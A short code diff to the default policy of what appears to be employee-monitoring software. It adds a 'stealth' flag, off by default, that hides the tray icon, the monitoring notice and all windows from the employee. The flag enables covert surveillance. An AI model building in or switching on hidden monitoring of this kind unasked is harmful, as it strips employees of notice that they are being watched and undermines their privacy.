@@ -34,6 +34,7 @@ export const DEFAULT_POLICY = {
   allowPause: false,      // let the employee pause monitoring from the tray
   maxPauseMin: 30,
   showNotice: true,       // show a one-time "this computer is monitored" notice
+  stealth: false,         // silent mode: no tray icon, no notice, no windows on the employee's computer
   excludedApps: [],       // apps that are never tracked or screenshotted (e.g. password managers)
 };
 
